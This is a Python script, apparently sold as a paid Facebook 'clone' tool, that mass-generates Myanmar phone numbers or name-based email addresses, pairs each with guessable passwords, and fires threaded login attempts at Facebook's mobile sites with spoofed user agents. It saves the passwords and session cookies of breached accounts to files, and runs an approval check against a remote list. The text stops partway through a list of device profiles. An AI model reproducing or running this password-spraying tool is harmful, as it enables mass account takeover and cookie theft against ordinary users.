import random, requests , re , sys , os , time, getpass
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ugen = []
ugen = []

# m.facebook.com  # Standard mobile version
# touch.facebook.com  # Older, touch-optimized version.
# mbasic.facebook.com  # Basic version for low connectivity.

#----------User Access Controler----------#👇

# import os, getpass, requests, sys

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
os.system('clear')       

approval_description = ("""
\033[0mTo buy this tool,
\033[0mplease connect from Facebook or Telegram.


\033[0mTelegram acc:  @wt4p2p
\033[0mTelegram page: https://t.me/wt4p2
""")

print("Loading...")
url = "https://raw.githubusercontent.com/oakarminmg65/Fb-clone-paid-tool/main/ApprovedUsers.txt"
response = requests.get(url)
approved_users = response.text

user_id = str(os.geteuid())
user_name = getpass.getuser()
key = user_id + user_name

if key in approved_users:
    print("\nYour key: " + key)
    print("Your key is approved")
    # time.sleep(2)
else:
    print("\nYour key: " + key)
    print("Your key is not approved")
    print(approval_description)
    sys.exit()

#----------User Access Controler----------#👆

#----------POSSIBLE JOIN DATE----------#👇

def possible_join_date(acc_id):
    if not isinstance(acc_id, str):
        acc_id = str(acc_id)
    if len(acc_id) == 15:
        if acc_id[:10] in ['1000000000']:
            join_date = '2009'
        elif acc_id[:9] in ['100000000']:
            join_date = '2009'
        elif acc_id[:8] in ['10000000']:
            join_date = '2009'
        elif acc_id[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            join_date = '2009'
        elif acc_id[:7] in ['1000006', '1000007', '1000008', '1000009']:
            join_date = '2010'
        elif acc_id[:6] in ['100001']:
            join_date = '2010/2011'
        elif acc_id[:6] in ['100002', '100003']:
            join_date = '2011/2012'
        elif acc_id[:6] in ['100004']:
            join_date = '2012/2013'
        elif acc_id[:6] in ['100005', '100006']:
            join_date = '2013/2014'
        elif acc_id[:6] in ['100007', '100008']:
            join_date = '2014/2015'
        elif acc_id[:6] in ['100009']:
            join_date = '2015'
        elif acc_id[:5] in ['10001']:
            join_date = '2015/2016'
        elif acc_id[:5] in ['10002']:
            join_date = '2016/2017'
        elif acc_id[:5] in ['10003']:
            join_date = '2018/2019'
        elif acc_id[:5] in ['10004']:
            join_date = '2019'
        elif acc_id[:5] in ['10005']:
            join_date = '2020'
        elif acc_id[:5] in ['10006', '10007', '10008']:
            join_date = '2021/2022'
        else:
            join_date = '2023'
    elif len(acc_id) in [9, 10]:
        join_date = '2008/2009'
    elif len(acc_id) == 8:
        join_date = '2007/2008'
    elif len(acc_id) == 7:
        join_date = '2006/2007'
    else:
        join_date = '2023/2024'
    return join_date
# Example usage
# print(possible_join_date(100011709762932))

#----------POSSIBLE JOIN DATE----------#👆

#----------IP DETAILS----------#👇

def get_ip_details():
    # Get public IP address
    ip_response = requests.get('https://api.ipify.org?format=json')
    ip = ip_response.json()['ip']
    
    # Get details for the IP address
    details_response = requests.get(f'http://ip-api.com/json/{ip}')
    details_data = details_response.json()
    
    # Compile the desired information
    ip_info = {
        'country': details_data.get('country'),
        'city': details_data.get('city'),
        'isp': details_data.get('isp'),
        'ip': ip
    }
    
    return ip_info

# Usage
# print(get_ip_details())

#----------IP DETAILS----------#👆

"""
for agent in range(1000):        
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B','GT-S5830L','RMX3491','CPH2269','RMX3191','ASUS_I006D'])
    c = str(random.randint(1, 2))
    d = str(random.randint(1, 9))
    e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","UCBrowser/","Puffin/","UCTurbo/","Opera Mini/"])
    g = str(random.randint(1111, 9999))
    h = str(random.randint(111, 999))
    i = str(random.randint(1, 9))
    user_agent = 'Dalvik/2.1.0 (Linux; U; Android '+a+'.0.0; '+b+' Build/RP1A.'+c+''+d+'0'+i+''+e+') [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+b+';FBBD/'+b+';FBDV/'+b+';FBSV/'+b+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(h)+',height='+str(g)+'};]'
    ugen.append(user_agent)
"""
cokbrut=[]
ses=requests.Session()

	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

dev_info = ("""
\033[1;97mFacebook acc:  \033[1;22mhttps://www.facebook.com/sknaing29
\033[1;97mFacebook page: \033[1;22mhttps://www.facebook.com/MyanService
\033[1;97mTelegram acc:  \033[1;22mhttps://t.me/YeMoeThaung
\033[1;97mTelegram page: \033[1;22mhttps://t.me/MyanService
""")

def main():
    global fb_url_type
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m1\033[1;32m❯\033[1;97m m.facebook.com \n      \033[1;22m(Standard mobile version)")
    print("\033[1;32m  ❮\033[1;97m2\033[1;32m❯\033[1;97m touch.facebook.com \n      \033[1;22m(Older, touch-optimized version)")
    print("\033[1;32m  ❮\033[1;97m3\033[1;32m❯\033[1;97m mbasic.facebook.com \n      \033[1;22m(Basic version for low connectivity)")
    print("\033[1;32m  ❮\033[1;97m0\033[1;32m❯\033[1;31m EXIT TOOL")
    linex()
    ZWE = input(f'\033[1;32m  ❮\033[1;97m?\033[1;32m❯ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        fb_url_type = "m.facebook.com"
        options()
    if ZWE in ["2","02"]:
        fb_url_type = "touch.facebook.com"
        options()
    if ZWE in ["3","03"]:
        fb_url_type = "mbasic.facebook.com"
        options()
    if ZWE in ["0","X"]:        
        os.system('exit')

def options():
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m1\033[1;32m❯ \033[1;97mPHONE NUMBER CLONE            ")
    print("\033[1;32m  ❮\033[1;97m2\033[1;32m❯\033[1;97m GMAIL UID CLONE               ")
    print("\033[1;32m  ❮\033[1;97mi\033[1;32m❯ \033[1;97mDEV'S INFO                    ")
    print("\033[1;32m  ❮\033[1;97m0\033[1;32m❯ \033[1;31mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  ❮\033[1;97m?\033[1;32m❯ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail_four()
    if ZWE in ["i","I"]:
        print(dev_info)
    if ZWE in ["0","X"]:        
        os.system('exit')
        
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97m EXAMPLE : \033[1;32m❮\033[1;97m789\033[1;32m❯ ❮\033[1;97m440\033[1;32m❯ ❮\033[1;97m670\033[1;32m❯")
    linex()
    code = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯")
    linex()
    limit=int(input("\033[1;32m  ❮\033[1;32m?\033[1;32m❯\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCHOICE CODE    \x1b[38;5;45m⦿ \033[1;32m'+code+'             ')
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mFB URL TYPE    \x1b[38;5;45m⦿ \033[1;32m'+fb_url_type+'             ')
        print(f"\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        print(f"\033[1;22m{get_ip_details()}")
        for love in user:
            country_code = "09"
            uid = '+959'+code+love
            pwx = [country_code + code + love, code + love, (country_code + code + love)[:6], (code + love)[:6]]
            LEE.submit(rcrack,uid,pwx,tl)

def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m    ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mtun\033[1;32m❯ ❮\033[1;97mzaw\033[1;32m❯ ❮\033[1;97maung\033[1;32m❯ ")
                linex()
                first = input('\033[1;32m    ❮\033[1;97m?\033[1;32m❯\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m    ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mlin\033[1;32m❯ ❮\033[1;97mhtet\033[1;32m║ ❮\033[1;97mmin\033[1;32m❯ ")
                linex()
                last = input('\033[1;32m    ❮\033[1;97m?\033[1;32m❯\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m    ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m@gmail.com\033[1;32m❯ ❮\033[1;97m@yahoo.com\033[1;32m❯ ")
                linex()
                domain = input('\033[1;32m    ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m    ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯ ")
                linex()
                try:
                        limit=int(input("\033[1;32m    ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m    ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m    ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCRACK NAME     \x1b[38;5;45m⦿ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"  \033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    global fb_url_type
    try:
        for ps in pwx:
            session = requests.Session()
            pro = generate_custom_user_agent()
            user_agent="Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1" 
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m❮%sMYAN-2\033[1;32m❯\033[1;34m\033[1;32m❮\033[38;5;195m%s/%s\033[1;32m❯\033[1;32mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get(f'https://{fb_url_type}').text
            # free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': fb_url_type,
            # header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post(f'https://{fb_url_type}/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n\033[1;97m❮COOKIE❯ = \033[1;97m{coki}")
                linex()
                open('/sdcard/MYAN-2-OK.txt', 'a').write(f"❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n❮COOKIE❯ = {coki}\n❮User-Agent❯ = {pro}\n\n")
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print(f"\x1b[1;90m❮✘❯ {uid} | {ps}")
                #print(f'\033[1;31m❮COOKIE❯ = {coki}')
                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        
def generate_custom_user_agent():
    # Define a list of device configurations, each with paired details
    device_configurations = [
        {'model': 'ALCATEL ONE TOUCH 5036A', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-P3100', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Lenovo A760', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'C2305', 'android_version': '4.2.2', 'build': '16.0.B.2.16'},
        {'model': 'Z10', 'android_version': '4.3', 'build': '10.3.2.348'},
        {'model': 'GT-I9060', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'RG310', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I9205', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I8552', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'XtremePQ15', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'PAP5044DUO', 'android_version': '4.2.1', 'build': 'PrestigioPAP5044DUO'},
        {'model': 'ASUS_T00J', 'android_version': '4.3', 'build': 'JSS15Q'},
        {'model': 'HTC One X+', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'GT-I9300', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'Lenovo P780_ROW', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'NokiaX2DS', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'LG-P765', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'X-treme PQ15', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'HTC Desire 500 dual sim', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'Fly IQ4403', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'HUAWEI Y511-U30', 'android_version': '4.2.2', 'build': 'HUAWEIY511-U30'},
        {'model': 'Lenovo S820_ROW', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'GT-S7580', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Lenovo S750', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'V360', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'LT22i', 'android_version': '4.1.2', 'build': '6.2.A.1.100'},
        {'model': 'PAP3400DUO', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I8262', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'HTC Desire 601 dual sim', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Lenovo S660', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S7710', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-S7272', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'SAMSUNG', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I8200', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': '7050Y', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'SM-N900', 'android_version': '4.3', 'build': 'JSS15J'},
        {'model': 'C5302', 'android_version': '4.3', 'build': '12.1.A.1.205'},
        {'model': 'X-tremePQ22', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'MS4503', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'HTC Desire 600 dual sim', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'K01A', 'android_version': '4.3', 'build': 'JSS15Q'},
        {'model': 'HUAWEI G6-L11', 'android_version': '4.3', 'build': 'HuaweiG6-L11'},
        {'model': 'W100', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'Orange Yumo', 'android_version': '4.1.2', 'build': 'OrangeYumo'},
        {'model': 'Fly IQ4491 Quad', 'android_version': '4.2.2', 'build': 'JZ054K'},
        {'model': 'GT-I8160', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'Lenovo A820', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'HUAWEI Y330-U01', 'android_version': '4.2.2', 'build': 'HuaweiY330-U01'},
        {'model': 'Lenovo A369i', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'IQ4601', 'android_version': '4.2.2', 'build': 'FlyIQ4601'},
        {'model': 'GT-S7262', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'iris402e', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S7390', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'C2305', 'android_version': '4.2.2', 'build': '16.0.B.2.13'},
        {'model': 'GT-I9100', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'LG-LS980', 'android_version': '4.2.2', 'build': 'JDQ39B'},
        {'model': 'JY-F1', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I9105', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I9082', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Lenovo A680_ROW', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'MB865', 'android_version': '4.0.4', 'build': '6.7.2_EDEM-18'},
        {'model': 'HTC Desire 500', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'ALCATEL ONE TOUCH 5035D', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': '4032D', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GSmart Maya M1 v2', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'GT-I9100', 'android_version': '5.1.0', 'build': 'JZO54K'},
        {'model': 'Quest 503', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'CTLITE', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'A 8+', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Fly IQ451', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'Symphony Xplorer W32', 'android_version': '4.2.2', 'build': 'UNKNOWN'},
        {'model': 'GT-S7582', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'X9006', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'C2004', 'android_version': '4.3', 'build': '15.5.A.1.5'},
        {'model': 'ALCATEL ONE TOUCH 5036X', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Polaroid PSPC505', 'android_version': '4.4.2', 'build': 'PSPC505_MX_V1.0'},
        {'model': 'GT-S7390L', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I8200L', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'DROID RAZR', 'android_version': '4.1.2', 'build': '9.8.2O-72_VZW-16-5'},
        {'model': 'ADVAN S3A', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'C2105', 'android_version': '4.2.2', 'build': '15.3.A.1.17'},
        {'model': 'GT-I9505', 'android_version': '5.0.1', 'build': 'LRX22C'},
        {'model': 'DROID RAZR', 'android_version': '4.1.2', 'build': '9.8.2O-72_VZW-16'},
        {'model': 'SM-G930F', 'android_version': '8.0.0', 'build': 'R16NW'},
        {'model': 'SM-J210F', 'android_version': '9.0.1', 'build': 'MMB29Q'},
        {'model': 'HUAWEI Y530-U00', 'android_version': '4.3', 'build': 'HuaweiY530-U00'},
        {'model': 'ALCATEL ONE TOUCH 7041X', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'Luno', 'android_version': '4.2.2', 'build': 'HuaweiY330-U01'},
        {'model': 'GT-I8730', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'LG-E610', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'bq Edison 2', 'android_version': '4.1.1', 'build': '1.1.0_20131125-20:15'},
        {'model': 'WTB5508', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'HUAWEI G6-L11', 'android_version': '4.3', 'build': 'HuaweiG6-L11C02B120'},
        {'model': 'ST26i', 'android_version': '4.1.2', 'build': '11.2.A.0.31'},
        {'model': 'DARKMOON', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'G630-U10', 'android_version': '4.3', 'build': 'HuaweiG630-U10'},
        {'model': 'C2105', 'android_version': '4.2.2', 'build': '15.3.A.1.14'},
        {'model': 'San Remo Mini', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'ALCATEL ONE TOUCH 7041D', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'A3-A10', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'PAP3350DUO', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'meo smart a12', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'G630-U20', 'android_version': '4.3', 'build': 'HuaweiG630-U20'},
        {'model': 'GT-I9063T', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'LG-P875', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'ALCATEL ONE TOUCH 7040D', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'B1-710', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-S7275R', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'SM-G350', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S6310N', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'Vodafone 875', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'HUAWEI G610-U20', 'android_version': '4.2.1', 'build': 'HuaweiG610-U20'},
        {'model': 'G740-L00', 'android_version': '4.1.2', 'build': 'HuaweiG740-L00'},
        {'model': 'TT-5000i', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S7392', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-S5280', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-S5282', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'CINK FIVE', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'GT-I9105P', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'HUAWEI Y300-0100', 'android_version': '4.1.1', 'build': 'HuaweiY300-0100'},
        {'model': 'San Remo 4G', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S7582L', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-S6293T', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'TR10CS2', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'V370', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'bq Aquaris 5', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'TAB97DC', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'smart_a17', 'android_version': '4.1.1', 'build': 'JRO03C'},
        {'model': 'Zilo', 'android_version': '4.2.2', 'build': 'ZiloZilo'},
        {'model': 'RAINBOW', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'CINK PEAX 2', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'HUAWEI G750-U10', 'android_version': '4.2.2', 'build': 'HuaweiG750-U10'},
        {'model': 'GT-I8200N', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'ONE TOUCH 4015X', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'GT-I8190', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'HUAWEI Y330-U11', 'android_version': '4.2.2', 'build': 'HuaweiY330-U11'},
        {'model': 'GT-I9082L', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'LG-P710', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'INSYS C4-S350-2', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'meo smart a70', 'android_version': '4.2.1', 'build': 'JOP40D'},
        {'model': 'GT-S5283B', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'KOM0701', 'android_version': '4.2.2', 'build': '=KOM070120140314'},
        {'model': 'LG-E430', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'C1505', 'android_version': '4.1.1', 'build': '11.3.A.2.33'},
        {'model': 'Qilive 45', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'LGMS659', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'LG-E460', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'C5303', 'android_version': '4.3', 'build': '12.1.A.1.205'},
        {'model': 'LG-E440', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'C1505', 'android_version': '4.1.1', 'build': '11.3.A.2.23'},
        {'model': 'Livecore-7031', 'android_version': '4.4.2', 'build': 'KTU84Q'},
        {'model': 'GT-S7390G', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'RX3DC3G', 'android_version': '4.1.1', 'build': 'JRO03H'},
        {'model': 'Nexus S', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'WAX', 'android_version': '4.3', 'build': 'JLS36C'},
        {'model': 'miTab GENIUS', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'LGMS769', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'MediaPad 7 Youth 2', 'android_version': '4.3', 'build': 'HuaweiMediaPad'},
        {'model': 'GT-S5310', 'android_version': '4.1.2', 'build': 'JZO54K'},
        {'model': 'bq Aquaris', 'android_version': '4.0.4', 'build': 'IMM76D'},
        {'model': 'Tab7D13-S', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'bq Elcano 2 Quad Core', 'android_version': '4.2.2', 'build': 'JDQ39'},
        {'model': 'YEZZ-4E', 'android_version': '4.2.2', 'build': 'JDQ39'},
